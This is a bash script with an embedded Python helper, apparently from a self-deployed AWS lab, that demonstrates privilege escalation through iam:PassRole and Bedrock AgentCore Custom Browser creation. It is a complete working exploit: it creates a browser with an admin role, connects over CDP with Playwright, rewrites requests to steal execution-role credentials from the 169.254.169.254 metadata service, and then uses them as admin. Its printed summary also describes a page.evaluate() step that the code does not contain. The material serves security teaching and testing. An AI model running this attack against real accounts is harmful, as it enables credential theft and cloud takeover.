#!/bin/bash

# Demo script for iam:PassRole + Bedrock AgentCore Custom Browser Creation privilege escalation
# This scenario demonstrates how a user with PassRole and AgentCore Browser permissions can
# create a new Custom Browser with a privileged execution role, start a browser session,
# then extract credentials from the MicroVM Metadata Service (MMDS) at 169.254.169.254
# via CDP/Playwright to gain admin access.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-bedrock-006-to-admin-starting-user"
TARGET_ROLE="pl-prod-bedrock-006-to-admin-target-role"
BROWSER_NAME="atk_browser_bedrock_006"
PYTHON_SCRIPT="/tmp/extract_bedrock_006_creds.py"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}AgentCore Custom Browser Creation to Admin Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_bedrock_006_iam_passrole_bedrockagentcore_createbrowser.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
    echo -e "${RED}Error: Could not extract target role ARN from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract admin cleanup credentials for the exit trap (starting user lacks DeleteBrowser)
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target role ARN: $TARGET_ROLE_ARN"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Track browser ID for the exit trap.
# Set BROWSER_ID to "pending" immediately before the CreateBrowser API call so the
# trap fires even if the script is killed before we can parse the response.
BROWSER_ID=""
DEMO_COMPLETED=0

# Exit trap: best-effort delete the browser on any non-clean exit to avoid orphan charges.
# The starting user does NOT have bedrock-agentcore:DeleteBrowser, so we use admin
# cleanup credentials for the delete call in the trap.
_bedrock_006_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM
    if [ -n "$BROWSER_ID" ] && [ "$BROWSER_ID" != "pending" ] && [ "$DEMO_COMPLETED" != "1" ]; then
        echo -e "${RED}[trap] Demo did not complete cleanly — best-effort deleting browser $BROWSER_ID to avoid orphan charges${NC}"
        export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
        export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
        unset AWS_SESSION_TOKEN
        aws bedrock-agentcore-control delete-browser \
            --browser-id "$BROWSER_ID" \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    elif [ "$BROWSER_ID" = "pending" ] && [ "$DEMO_COMPLETED" != "1" ]; then
        # The create call may have succeeded but we never parsed the ID; list and delete by name
        echo -e "${RED}[trap] Browser ID unknown — attempting cleanup by name${NC}"
        export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
        export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
        unset AWS_SESSION_TOKEN
        ORPHAN_ID=$(aws bedrock-agentcore-control list-browsers \
            --region "$AWS_REGION" \
            --output json 2>/dev/null | \
            jq -r ".browserSummaries[]? | select(.name == \"$BROWSER_NAME\") | .browserId" \
            2>/dev/null | head -1)
        if [ -n "$ORPHAN_ID" ]; then
            aws bedrock-agentcore-control delete-browser \
                --browser-id "$ORPHAN_ID" \
                --region "$AWS_REGION" >/dev/null 2>&1 || true
        fi
    fi
    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _bedrock_006_exit_handler EXIT INT TERM

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Step 2: Check prerequisites
echo -e "${YELLOW}Step 2: Checking prerequisites${NC}"
echo "Verifying required tools are installed..."

if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed${NC}"
    echo "Please install jq: https://stedolan.github.io/jq/download/"
    exit 1
fi
echo -e "${GREEN}✓ jq is installed${NC}"

if ! command -v python3 &> /dev/null; then
    echo -e "${RED}Error: python3 is not installed${NC}"
    echo "Please install python3"
    exit 1
fi
echo -e "${GREEN}✓ python3 is installed${NC}"

if ! python3 -c "import boto3" &> /dev/null; then
    echo -e "${RED}Error: boto3 is not installed${NC}"
    echo "Please install boto3: pip3 install boto3"
    exit 1
fi
echo -e "${GREEN}✓ boto3 is installed${NC}"

if ! python3 -c "from playwright.sync_api import sync_playwright" &> /dev/null; then
    echo -e "${RED}Error: playwright Python package is not installed${NC}"
    echo "Please install playwright: pip3 install playwright && playwright install chromium"
    exit 1
fi
echo -e "${GREEN}✓ playwright is installed${NC}"
echo ""

# [EXPLOIT] Step 3: Configure AWS credentials with starting user and verify identity
echo -e "${YELLOW}Step 3: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 4: Get account ID
echo -e "${YELLOW}Step 4: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 5: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 5: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Create the AgentCore Custom Browser passing the target admin role
echo -e "${YELLOW}Step 6: Creating AgentCore Custom Browser with admin execution role${NC}"
echo "Browser name: $BROWSER_NAME"
echo "Target role ARN: $TARGET_ROLE_ARN"
echo ""
echo "This is the privilege escalation vector — passing the admin role to a new Custom Browser."
echo "The Browser provisions an underlying Firecracker MicroVM with the execution role credentials"
echo "available via MMDS at 169.254.169.254. A CDP/Playwright session can then intercept MMDS"
echo "requests inside the browser context to read those credentials."
echo ""

show_attack_cmd "Attacker" "aws bedrock-agentcore-control create-browser --region $AWS_REGION --name $BROWSER_NAME --execution-role-arn $TARGET_ROLE_ARN --network-configuration '{\"networkMode\":\"PUBLIC\"}' --output json"

# Set BROWSER_ID sentinel before the API call so the trap fires even if the script is
# killed between the call succeeding and our response-parsing code running.
BROWSER_ID="pending"

CREATE_OUTPUT=$(aws bedrock-agentcore-control create-browser \
    --region "$AWS_REGION" \
    --name "$BROWSER_NAME" \
    --execution-role-arn "$TARGET_ROLE_ARN" \
    --network-configuration '{"networkMode":"PUBLIC"}' \
    --output json 2>&1)

CREATE_EXIT=$?

if [ $CREATE_EXIT -ne 0 ]; then
    echo -e "${RED}Error: Failed to create AgentCore Custom Browser${NC}"
    echo "$CREATE_OUTPUT"
    BROWSER_ID=""  # Clear sentinel so trap doesn't attempt a delete with a garbage ID
    exit 1
fi

BROWSER_ID=$(echo "$CREATE_OUTPUT" | jq -r '.browserId // empty')

if [ -z "$BROWSER_ID" ] || [ "$BROWSER_ID" == "null" ]; then
    echo -e "${RED}Error: Could not parse browser ID from create response${NC}"
    echo "$CREATE_OUTPUT"
    BROWSER_ID=""
    exit 1
fi

echo "Browser ID: $BROWSER_ID"
echo -e "${GREEN}✓ Successfully created AgentCore Custom Browser with admin execution role!${NC}"
echo ""

# [OBSERVATION] Step 7: Poll GetBrowser until status = READY
echo -e "${YELLOW}Step 7: Waiting for Custom Browser to reach READY state${NC}"
echo "This takes 2-5 minutes while AgentCore provisions the underlying MicroVM..."
echo ""

MAX_WAIT=300   # 5 minutes
POLL_INTERVAL=15
ELAPSED=0
BROWSER_STATUS=""

use_readonly_creds
export AWS_REGION=$AWS_REGION

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws bedrock-agentcore-control get-browser --browser-id $BROWSER_ID --region $AWS_REGION --query 'status' --output text"
    BROWSER_STATUS=$(aws bedrock-agentcore-control get-browser \
        --browser-id "$BROWSER_ID" \
        --region "$AWS_REGION" \
        --query 'status' \
        --output text 2>/dev/null || echo "UNKNOWN")

    echo "  Status: $BROWSER_STATUS (${ELAPSED}s elapsed)"

    if [ "$BROWSER_STATUS" = "READY" ]; then
        echo -e "${GREEN}✓ Custom Browser reached READY state${NC}"
        break
    fi

    if [ "$BROWSER_STATUS" = "FAILED" ] || [ "$BROWSER_STATUS" = "CREATE_FAILED" ]; then
        echo -e "${RED}Error: Browser provisioning failed (status: $BROWSER_STATUS)${NC}"
        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ "$BROWSER_STATUS" != "READY" ]; then
    echo -e "${RED}Error: Browser did not reach READY state within ${MAX_WAIT}s (last status: $BROWSER_STATUS)${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 8: Start a browser session to obtain a WebSocket URL
echo -e "${YELLOW}Step 8: Starting a browser session${NC}"
echo "Starting a session to get a CDP WebSocket URL for Playwright to connect to..."
echo ""

use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "aws bedrock-agentcore start-browser-session --browser-identifier $BROWSER_ID --region $AWS_REGION --output json"
SESSION_OUTPUT=$(aws bedrock-agentcore start-browser-session \
    --browser-identifier "$BROWSER_ID" \
    --region "$AWS_REGION" \
    --output json 2>&1)

SESSION_EXIT=$?

if [ $SESSION_EXIT -ne 0 ]; then
    echo -e "${RED}Error: Failed to start browser session${NC}"
    echo "$SESSION_OUTPUT"
    exit 1
fi

SESSION_ID=$(echo "$SESSION_OUTPUT" | jq -r '.sessionId // empty')
WS_URL=$(echo "$SESSION_OUTPUT" | jq -r '.streams.automationStream.streamEndpoint // empty')

if [ -z "$SESSION_ID" ] || [ "$SESSION_ID" == "null" ]; then
    echo -e "${RED}Error: Could not parse session ID from start-browser-session response${NC}"
    echo "$SESSION_OUTPUT"
    exit 1
fi

if [ -z "$WS_URL" ] || [ "$WS_URL" == "null" ]; then
    echo -e "${RED}Error: Could not parse WebSocket URL from start-browser-session response${NC}"
    echo "$SESSION_OUTPUT"
    exit 1
fi

echo "Session ID: $SESSION_ID"
echo "WebSocket URL: ${WS_URL:0:80}..."
echo -e "${GREEN}✓ Browser session started${NC}\n"

# [EXPLOIT] Step 9: Create Python script to connect via CDP and extract MMDS credentials
echo -e "${YELLOW}Step 9: Creating Python script to extract MMDS credentials via CDP${NC}"
echo "Creating script that uses Playwright to connect over CDP and intercept MMDS requests..."

cat > "$PYTHON_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
"""
Extract AgentCore Browser execution role credentials via CDP/Playwright.

The Custom Browser runs in a Firecracker MicroVM whose execution role credentials
are available at the MMDS endpoint (169.254.169.254). This script:
  1. Signs the CDP WebSocket connection with SigV4 (required by AgentCore)
  2. Connects to the browser's CDP WebSocket endpoint via Playwright
  3. Uses page.goto() navigation (not fetch) to reach MMDS — navigation requests
     bypass Chrome's Private Network Access (PNA) policy that blocks sub-resource
     fetch() calls to link-local addresses
  4. Route handlers rewrite GET navigations: token endpoint GET → PUT with TTL
     header; credential endpoints get the IMDSv2 token injected as a header
  5. Prints the credentials JSON to stdout for the calling shell to parse
"""
import sys
import json
import os
from urllib.parse import urlparse

from botocore.auth import SigV4Auth
from botocore.awsrequest import AWSRequest
from botocore.credentials import Credentials
from playwright.sync_api import sync_playwright

if len(sys.argv) < 4:
    print("Usage: python3 extract_bedrock_006_creds.py <browser_id> <region> <ws_url>", file=sys.stderr)
    sys.exit(1)

BROWSER_ID = sys.argv[1]
AWS_REGION  = sys.argv[2]
WS_URL      = sys.argv[3]

MMDS_TOKEN_URL = "http://169.254.169.254/latest/api/token"
MMDS_CREDS_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials"

def sign_websocket_headers(ws_url, region):
    """Generate SigV4 auth headers for a WebSocket connection to AgentCore."""
    access_key = os.environ.get('AWS_ACCESS_KEY_ID', '')
    secret_key = os.environ.get('AWS_SECRET_ACCESS_KEY', '')
    session_token = os.environ.get('AWS_SESSION_TOKEN')

    if not access_key or not secret_key:
        print("Error: AWS credentials not found in environment", file=sys.stderr)
        sys.exit(1)

    creds = Credentials(access_key, secret_key, session_token)

    # SigV4 signing uses https:// scheme (WebSocket upgrade is a GET request)
    signing_url = ws_url.replace('wss://', 'https://')
    parsed = urlparse(signing_url)

    request = AWSRequest(method='GET', url=signing_url, headers={'host': parsed.hostname})
    SigV4Auth(creds, 'bedrock-agentcore', region).add_auth(request)
    return dict(request.headers)

print(f"Connecting to browser {BROWSER_ID} via CDP...", file=sys.stderr)
print(f"Signing WebSocket connection with SigV4...", file=sys.stderr)

signed_headers = sign_websocket_headers(WS_URL, AWS_REGION)

# Shared state for the IMDSv2 token — set after the first navigation so that
# subsequent route handlers can inject it as a request header.
state = {'token': None}

def handle_mmds_route(route, request):
    url = request.url
    if url == MMDS_TOKEN_URL:
        # IMDSv2 token endpoint requires a PUT with a TTL header.
        # Chrome sends this navigation as GET; rewrite it to PUT before forwarding.
        route.continue_(
            method="PUT",
            headers={
                **dict(request.headers),
                "X-aws-ec2-metadata-token-ttl-seconds": "60",
            },
        )
    elif state['token']:
        # All other MMDS requests: inject the already-acquired IMDSv2 token.
        route.continue_(
            headers={
                **dict(request.headers),
                "X-aws-ec2-metadata-token": state['token'],
            },
        )
    else:
        route.continue_()

with sync_playwright() as pw:
    browser = pw.chromium.connect_over_cdp(WS_URL, headers=signed_headers)
    # Always create a fresh context — the default CDP context may not support
    # route interception reliably.
    context = browser.new_context()
    context.route("http://169.254.169.254/**", handle_mmds_route)
    page = context.new_page()

    print("Step 1: Acquiring IMDSv2 token via page navigation...", file=sys.stderr)
    token_resp = page.goto(MMDS_TOKEN_URL, wait_until="commit")
    if not token_resp or not token_resp.ok:
        status = token_resp.status if token_resp else "no response"
        print(f"Error: MMDS token request failed (status {status})", file=sys.stderr)
        sys.exit(1)
    state['token'] = token_resp.text().strip()
    print(f"Acquired IMDSv2 token ({len(state['token'])} chars)", file=sys.stderr)

    print("Step 2: Fetching IAM role name from MMDS...", file=sys.stderr)
    role_resp = page.goto(f"{MMDS_CREDS_URL}/", wait_until="commit")
    if not role_resp or not role_resp.ok:
        status = role_resp.status if role_resp else "no response"
        print(f"Error: Could not fetch role name from MMDS (status {status})", file=sys.stderr)
        sys.exit(1)
    role_name = role_resp.text().strip()
    print(f"Role name: {role_name}", file=sys.stderr)

    print(f"Step 3: Fetching credentials for role {role_name}...", file=sys.stderr)
    creds_resp = page.goto(f"{MMDS_CREDS_URL}/{role_name}", wait_until="commit")
    if not creds_resp or not creds_resp.ok:
        status = creds_resp.status if creds_resp else "no response"
        print(f"Error: Could not fetch credentials from MMDS (status {status})", file=sys.stderr)
        sys.exit(1)
    creds_text = creds_resp.text()

    browser.close()

if not creds_text:
    print("Error: No credentials returned from MMDS", file=sys.stderr)
    sys.exit(1)

# Parse and pretty-print so the calling shell can extract individual fields
try:
    creds = json.loads(creds_text)
    print(json.dumps(creds, indent=2))
except json.JSONDecodeError:
    # Print raw output so the caller can inspect it
    print(creds_text)
PYEOF

echo -e "${GREEN}✓ Python script created at $PYTHON_SCRIPT${NC}\n"

# [EXPLOIT] Step 10: Run the Python script to extract MMDS credentials via CDP
echo -e "${YELLOW}Step 10: Extracting admin credentials from MMDS via CDP/Playwright${NC}"
echo "Running Python script to connect to browser over CDP and read execution role credentials..."
echo "The route handler rewrites the MMDS token request and the JS fetch reads credentials from 169.254.169.254..."
echo ""

# Starting user credentials are already set from Step 8; keep them active for the
# Python script so the WebSocket URL auth context is consistent.
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_attack_cmd "Attacker" "python3 $PYTHON_SCRIPT $BROWSER_ID $AWS_REGION <ws_url>"
CREDS_JSON=$(python3 "$PYTHON_SCRIPT" "$BROWSER_ID" "$AWS_REGION" "$WS_URL" 2>/dev/null)
PYTHON_EXIT=$?

if [ $PYTHON_EXIT -ne 0 ] || [ -z "$CREDS_JSON" ]; then
    echo -e "${RED}Error: Failed to extract credentials from MMDS${NC}"
    echo "Running again with verbose output for debugging:"
    python3 "$PYTHON_SCRIPT" "$BROWSER_ID" "$AWS_REGION" "$WS_URL"
    exit 1
fi

EXTRACTED_ACCESS_KEY=$(echo "$CREDS_JSON" | jq -r '.AccessKeyId // empty' 2>/dev/null)
EXTRACTED_SECRET_KEY=$(echo "$CREDS_JSON" | jq -r '.SecretAccessKey // empty' 2>/dev/null)
EXTRACTED_SESSION_TOKEN=$(echo "$CREDS_JSON" | jq -r '.Token // empty' 2>/dev/null)

if [ -z "$EXTRACTED_ACCESS_KEY" ] || [ "$EXTRACTED_ACCESS_KEY" = "null" ]; then
    echo -e "${RED}Error: Could not parse credentials from MMDS response${NC}"
    echo "Raw MMDS response:"
    echo "$CREDS_JSON"
    exit 1
fi

echo -e "${GREEN}✓ Successfully extracted credentials from MMDS${NC}"
echo -e "${GREEN}✓ Parsed AccessKeyId, SecretAccessKey, and Token${NC}\n"

# Step 11: Switch to extracted admin credentials and verify identity
echo -e "${YELLOW}Step 11: Switching to extracted admin credentials${NC}"
export AWS_ACCESS_KEY_ID="$EXTRACTED_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$EXTRACTED_SECRET_KEY"
export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

show_cmd "Attacker (now admin)" "aws sts get-caller-identity --query 'Arn' --output text"
ADMIN_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $ADMIN_IDENTITY"

if [[ $ADMIN_IDENTITY == *"$TARGET_ROLE"* ]]; then
    echo -e "${GREEN}✓ Successfully obtained admin role credentials via MMDS${NC}"
else
    echo -e "${YELLOW}⚠ Warning: Identity doesn't match expected role name${NC}"
fi
echo ""

# Step 12: Verify administrator access
echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 13: Capture the CTF flag from SSM Parameter Store
# The extracted execution role credentials carry AdministratorAccess, which includes
# ssm:GetParameter. No extra permissions are needed.
echo -e "${YELLOW}Step 13: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_PARAM_NAME="/pathfinding-labs/flags/bedrock-006-to-admin"

show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
FLAG_VALUE=$(aws ssm get-parameter \
    --name "$FLAG_PARAM_NAME" \
    --query 'Parameter.Value' \
    --output text 2>/dev/null)

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing the summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
DEMO_COMPLETED=1

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (limited permissions)"
echo "2. Used iam:PassRole + CreateBrowser to deploy a new Custom Browser with the admin execution role"
echo "3. Waited for the browser to reach READY state (~2-5 min)"
echo "4. Called StartBrowserSession to obtain a CDP WebSocket URL"
echo "5. Used Playwright to connect to the browser over CDP"
echo "6. Registered a context.route() handler to intercept and rewrite the MMDS token request"
echo "7. Used page.evaluate() to run the full IMDSv2 flow in JS, reading execution role credentials"
echo "8. Used extracted credentials to operate as the admin execution role"
echo "9. Read CTF flag from SSM Parameter Store"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER"
echo "  → (iam:PassRole + bedrock-agentcore:CreateBrowser)"
echo "  → Custom Browser '$BROWSER_NAME' with $TARGET_ROLE as execution role"
echo "  → (bedrock-agentcore:StartBrowserSession + ConnectBrowserAutomationStream)"
echo "  → CDP/Playwright context.route hook rewrites MMDS token request"
echo "  → Reads execution role credentials at 169.254.169.254"
echo "  → $TARGET_ROLE (AdministratorAccess)"
echo "  → (ssm:GetParameter) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AgentCore Custom Browser: $BROWSER_NAME (ID: $BROWSER_ID)"
echo "- Execution Role: $TARGET_ROLE"

echo -e "\n${RED}⚠ Warning: The AgentCore Custom Browser '$BROWSER_NAME' is still deployed${NC}"
echo -e "${RED}⚠ AgentCore Browsers may incur charges while running${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
